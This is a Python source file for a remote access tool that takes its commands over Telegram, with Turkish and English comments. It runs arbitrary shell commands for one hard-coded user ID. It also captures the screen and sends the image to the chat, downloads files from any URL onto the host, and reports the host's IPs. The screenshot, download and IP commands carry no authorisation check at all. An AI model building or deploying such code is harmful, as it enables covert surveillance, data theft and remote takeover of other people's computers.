#!/usr/bin/python
#Nyarlko's Remote Terminal Telegram Access Tool
#Programı ben yazmış olabilirim ama kullananlara hiçbir şekilde garanti vermemekteyim.
#Tamamiyle kendi sorumluluğunuzla kullanın.
#Nyarlko hiçbir sorumluluk kabul etmemektedir.
#Nyarlko does not accept any kind of liability from this program. Use it at your own risk!
import telepot,telepot.loop,telepot.namedtuple
import sqlite3,threading,os,time,pprint,random,validators,base64,json,subprocess
import configparser as c
import subprocess as sp
import requests as rq
from PIL import ImageGrab as sc
import socket

nya=0
rlko=0
lang="tr" #For english type en. Türkçe için tr yazın.
ROOT_ACCESS=[972561465] #Let'secure our access to computer with Telegram user id. Bilgisayara erişimimizi telegram id'miz ile güvenceye alalım.'
xTOXEN="12341321:DA2doSKDWAD232SD2sDW23S" #Add your own toxen here. Buraya kendi toxeninizi yazın.
db_exists=os.path.exists("database.db")
conn=sqlite3.connect("database.db", check_same_thread=False)
cur=conn.cursor()
xdir=os.getcwd()
try:
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
except:
    if lang=="tr":
        ip="Bilinmiyor."
        hostname="Bilinmiyor."
    else:
        ip="Unknown."
        hostname="Unknown."
    pass
try:
    external_ip = rq.get('https://api.ipify.org').text
except:
    if lang=="tr":
        external_ip="Bilinmiyor."
    else:
        external_ip="Unknown."
    pass
if not db_exists:
    cur.execute("CREATE TABLE user (id INT, username CHAR(50), firstname VARCHAR(51),lastname CHAR(52))")
    conn.commit()
    del cur
set_exists=os.path.exists("degerler.txt")
if not set_exists:
    cp = c.RawConfigParser()
    cp.add_section('veri')
    cp.set('veri', 'TOXEN', xTOXEN)
    setup = open('degerler.txt', 'w')
    cp.write(setup)
    setup.close()
nya = c.RawConfigParser()
nya.read('degerler.txt')
TOXEN = nya['veri'] ['TOXEN']
bot=telepot.Bot(TOXEN)
def access(command): #Access the terminal. Komut satırına erişim.
    global output
    try:
        output = sp.getoutput(f"""{command}""")
        print(output)
    except:
        pass
def eagleye(): #Capture screen photo. Ekran resmini kaydet.
    global spp
    try:
        spp=xdir+"\EagleEye.jpg"
        ss=sc.grab()
        ss.save(spp)
    except:
        pass
def download(url,filename):
    try:
        r = rq.get(url, allow_redirects=True)
        open(filename, 'wb').write(r.content)
    except Exception as ex:
        print(ex)
def handle(msg):
   try:
    pprint.pprint(msg)
    cur=conn.cursor()
    et="@"
    userid=msg["from"]["id"]
    chatid=msg["chat"]["id"]
    try:
        username=et+msg["from"]["username"]
    except:
        username=""
    try:
        firstname=msg["from"]["first_name"]
    except:
        firstname=""
    try:
        lastname=msg["from"]["last_name"]
    except:
        lastname=""
    data=""
    if "data" in msg.keys():
        data=msg["data"]
    text=""
    if "document" in msg.keys():
        text="FileID:"+msg["document"]["file_id"]
    elif "photo" in msg.keys():
        text="FileID:"+msg["photo"][0]["file_id"]
    else:
        text=msg["text"]
    def sendImg(): #Send screen capture image to telegram. Telegram hesabımıza ekran görüntüsünü yollayalım.
        try:
            bot.sendPhoto(chatid, photo=open(spp, 'rb'))
            os.remove(spp) #Delete the file after sent. Yolladıktan sonra dosyayı silelim.
        except:
            pass
    if text.startswith("/x ") and userid in ROOT_ACCESS: #Check if user has rights to access our computer via telegram id. Kullanıcının bilgisayarımıza erişimi olup olmadığınız telegram id ile konrol edelim.
        execute=text.replace("/x ","")
        print(execute)
        access(execute)
        bot.sendMessage(chatid,f"{output}")
    elif text=="/yardim" or text=="/help":
        if lang=="tr":
            bot.sendMessage(chatid,"Nyarlko tarafından yazılmıştır.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nKomutlar:\n/x Komut satırına yazacağın komut.\n/ss Ekran alıntısını alır ve sana yollar.\n/d https://indirme.linki dosyadi.exe Dosyayı bilgisayarınıza indirir.\n/ip Ip adresinizi gösterir.")
        else:
            bot.sendMessage(chatid,"Written by Nyarlko.\nhttps://github.com/ny4rlk0/Telegram-ile-Uzaktan-Erisim-Araci-Remote-Access-Tool-with-Telegram/\nCommands:\n/x Command you wanna execute.\n/ss screenshot the computer.\n/d https://download.link filename.exe Downloads the file.\n/ip Shows your ip address.")
        if userid in ROOT_ACCESS:
            if lang=="tr":
                bot.sendMessage(chatid,"Admin yetkiniz vardır.")
            else:
                bot.sendMessage(chatid,"You have Admin access.")
        else:
            if lang=="tr":
                bot.sendMessage(chatid,"Admin yetkiniz yoktur.")
            else:
                bot.sendMessage(chatid,"You don't have Admin access.")
    elif text.startswith("/ss"):
        eagleye()
        sendImg()
    elif text.startswith("/d "):
        try:
            url=text.replace("/d ","")
            url,filename=url.split(" ")
            try:
                download(url,filename)
            except:
                if lang=="tr":
                    bot.sendMessage(chatid,f"{filename} indirilirken hata ile karşılaşıldı.")
                else:
                    bot.sendMessage(chatid,f"Failed while downloading {filename}.")
                pass
            else:
                if lang=="tr":
                    bot.sendMessage(chatid,f"{filename} başarıyla indirildi.")
                else:
                    bot.sendMessage(chatid,f"{filename} downloaded successfully.")
            if lang=="tr":
                print(url,filename+" indirildi.")
            else:
                print(url,filename+" has downloaded.")
        except:
            pass
    elif text.startswith("/ip"):
        if lang=="tr":
            bot.sendMessage(chatid,f"Dahili IP: {ip}\nHost Adı: {hostname}\nHarici IP: {external_ip}")
        else:
            bot.sendMessage(chatid,f"Internal IP: {ip}\nHost Name: {hostname}\nExternal IP: {external_ip}")
   except:
    pass
if __name__=="__main__":
    telepot.loop.MessageLoop(bot,handle).run_forever()
